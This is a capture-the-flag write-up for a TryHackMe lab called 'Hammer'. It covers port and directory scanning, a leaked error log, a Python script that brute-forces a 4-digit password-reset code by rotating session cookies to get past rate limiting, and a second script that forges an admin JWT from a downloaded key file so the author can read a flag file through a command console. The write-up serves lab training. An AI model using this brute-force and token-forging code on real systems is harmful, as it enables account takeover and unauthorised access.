## THM CTF - Hammer

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   hammer.thm
```
Now we can proceed with an Nmap scan.
```
sudo nmap -sS -T4 -p- hammer.thm
sudo nmap -sS -sV -sC -T4 -p22,1337 hammer.thm
```
We’ve found two open ports, but for now, we’re focusing on **HTTP**. We’ll leave the SSH port open for later if we need it.

We can ignore all other Nmap scans for now because we need to test a web application. However, the scan reveals that the ```HTTPOnly flag``` for cookies isn’t set.

Connecting to the site at ```http://hammer.thm:1337```, we find a login page.

Examining the page’s HTML, we read a developer note that should be deleted for security reasons.
```
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```
Keeping this information for later use, we can try to authenticate and analyse the site response to a bad authentication.

The request sends to the server:
* PHPSESSID as cookie
* email
* password

At the bottom of the login page, there is a ```"forgot your password?"``` link.
However, it seems we are at a dead end because we have no clue about any possible email to submit.

We turn back to the Dev Note found before.

We can list directories using ```Gobuster``` or ```Dirb```, but we need to modify the ```common.txt``` file to follow the new pattern. We can easily achieve this by using the sed or awk command.
```
cp /usr/share/wordlists/dirb/common.txt .
sed 's/^/hmr_/' common.txt > common_hmr.txt
```
With this new file, we can launch two different ```Gobuster``` enumerations.
```
gobuster dir -u http://hammer.thm:1337 -w common_hmr.txt
gobuster dir -u http://hammer.thm:1337 -w common.txt -x html,js,txt,php,db,json,log
```
The first one successfully enumerates 4 folders:
* /hmr_css 
* /hmr_images
* /hmr_js
* /hmr_logs  

For now the most interesting is:
* hmr_logs

Visiting this folder, it reveals an ```error.logs``` file that contains some useful information:
* LimitInternalRecursion error with a limit of 10
* user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
* /admin-login
* /var/www/html/locked-down

At least now we have a valid email to use.

The second scan successfully enumerates some interesting files/folders like:
* composer.json - reveals to us that the site use firebase/php-jwt 6.10
* /vendor
* /javascript
* dashboard.php - maybe the landing page after a successful login procedure
* /phpMyAdmin

Now we can try a password recovery with the newest found email:
* tester@hammer.thm

The new page ask for a 4 digit code with a countdown. However submitting a code gives us the opportunity to analyse the request containing 2 parameters:
* recovery code
* s - it represents the number of seconds remaining until the countdown ends when we submitted the form.

This implies that we could potentially control the countdown.

Trying various code, after maybe 9 tries we receive the message:
```
Rate limit exceeded. Please try again later.
```
So the main problem now is the number of attempt for every password reset request.
However we cannot try again, but one way this site can control this behaviour is thanks to ```Javascript``` and ```Cookies```.

We can try to request a new ```Cookie``` deleting the old one. It works. We can reset the password again, however we need a new code, so this is a partial victory.

Open ```BurpSuite``` and analyse the traffic intercepted while submitting the code. ```Send to the repeater```.

In the response header we find the value:
* Rate-Limit-Pending: 6

The server stores the number of our failed attempts to submit the correct code.

While analysing the response, we sent another request with ```s=174```. However the real timer was expired and the server response is:
```
Time elapsed. Please try again
```
We can deduce that this time is controlled server-side.

Analysing all this information, we can deduce that we can’t bypass the timer. However, we might be able to exceed the maximum attempt limit by using a fresh ```Cookie``` before the last one expires. This would give us 9 more tries every time we change the ```Cookie```.

We need to create a script to automate all this process.

<details><summary><h3>THM_Hammer_brute_OTP.py</h3></summary>
  
```python

import requests
# from concurrent.futures import ThreadPoolExecutor

# Define the URLs for password recovery
hammer_ip = 'hammer.thm'
hammer_port = '1337' # default 80
hammer_full = f'{hammer_ip}:{hammer_port}'
hammer_url = f'http://{hammer_ip}:{hammer_port}'
recovery_url = f'{hammer_url}/reset_password.php'

# Define password recovery credentials
credentials = {
    'email': 'tester@hammer.thm'
}

# Function to get a fresh cookie
def get_cookie(url,payload):
	headers={
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
	}

	session = requests.Session()
	response = session.post(url, headers=headers, data=payload)
	return session, session.cookies.get("PHPSESSID", None)

# Function to brute force OTP
def submit_code(session, url, code):
	payload={
		'recovery_code': code,
		's': '160'
	}
	headers={
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
	}

	response = session.post(url, headers=headers, data=payload)
	return response



# Code for using only one thread
# Get first cookie
session, cookie = get_cookie(recovery_url, credentials)
for i in range(10000):
	recovery_code = f"{i:04d}" # Generate codes 0000-9999
	print(f"Trying...{recovery_code}")
	
	# Submit the code
	response = submit_code(session, recovery_url, recovery_code)
	
	#Get a new cookie if the Rate-Limit-Pending = 1
	if int(response.headers['Rate-Limit-Pending']) <2:
		 session, cookie = get_cookie(recovery_url,credentials)

	# Break the loop if we find a valid code and print the cookie to use
	if "Invalid" not in response.text and response.status_code in (302,200):
		print(f"FOUND------ valid code found {recovery_code}")
		print(f"USE this cookie: {cookie}")
		break


"""
# Worker function for threads
def worker(recovery_code):
    # Create a new session and fetch a cookie for this thread
    session, cookie = get_cookie(recovery_url, credentials)

    # Attempt the recovery code
    response = submit_code(session, recovery_url, recovery_code)

    if "Invalid" not in response.text and response.status_code in (302,200):
        print(f"Valid code found by thread: {recovery_code}. Cookie {cookie}")
        return 200

# Multithreaded execution
with ThreadPoolExecutor(max_workers=10) as executor:
    codes = [f"{i:04d}" for i in range(10000)]  # Generate codes 0000-9999
    results = list(executor.map(worker, codes))
    if results == 200:
        exit()

# Filter out None results to find valid codes
valid_codes = [code for code in results if code]
print("Valid codes found:", valid_codes)
"""
```

</details>

The code is written for a single thread, which proved sufficient to find the code within the specified timeframe of 180 seconds. However, we can leverage the assistance of the AI to develop a multithreaded code that can potentially enhance its speed.

We have found a valid ```Cookie```, so we can navigate to recovery page, insert the email, change the ```Cookie```, refresh and now we can change the password.

After logging in we find the ```first flag```, however after a little while, we are automatically logged out.

Analysing the page content, we discover a script that checks for a specific ```Cookie``` ```persistenceSession```. If the ```Cookie``` is expired, it prompts our logout.
We can simply change the ```Cookie``` expiration time to obtain a longer session.

Now we need to find a way to read the content of the file ```/home/ubuntu/flag.txt```, however the console accept only ```ls``` as command.

Diving deep in the ```Cookie``` session we find a ```token``` that seems like a ```JWT```.

Using [JWT.io](https://jwt.io) we can identify it as a token for a normal user.

We can change the ```role``` to ```admin``` but we do not know the secret code of the key:
```
"kid": "/var/www/mykey.key"
```
However while using the console and sumbitting the ```ls``` command, we noticed a ```188ade1.key``` that can be used to produce a new ```JWT```.

We can download it a change the ```JWT``` accordingly using the secret inside.
```
wget http://hammer.thm:1337/188ade1.key
```
[JWT.io](https://jwt.io)
```
"kid": "/var/www/html/188ade1.key"
"role": "admin"
"secret" : 188ade1.key secret
```
Now we need to use ```BurpSuite``` to submit a command.
Sending the request to the repeater, we need to change the old ```JWT``` to the new one, both in ```token``` field and ```Authorisation: Bearer```, changing also the ```command```.
```
"command": "cat /home/ubuntu/flag.txt"
```
This way we can obtain the second flag in the response.

Note: to generate a new JWT token, we can use the python code attached and not only the site [JWT.io](https://jwt.io).


<details><summary><h3>THM_Hammer_generate_JWT.py</h3></summary>
  
```python

import jwt
from datetime import datetime

# Secret key
secret_key = "INSERT SECRET KEY HERE"

# JWT header'
header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

# Set JWT Issued at Time and Expiration Time

iat = int(datetime(2025, 1, 28, 18, 0).timestamp())
exp = int(datetime(2025, 1, 28, 19, 0).timestamp())

# Payload with the 'admin' role
payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": iat, # change this Value to be Issued at Time that you need
    "exp": exp, # change this value to be coherent with expiration date
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

# Encode the JWT
token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)

# Print the token
print(token)

```
</details>
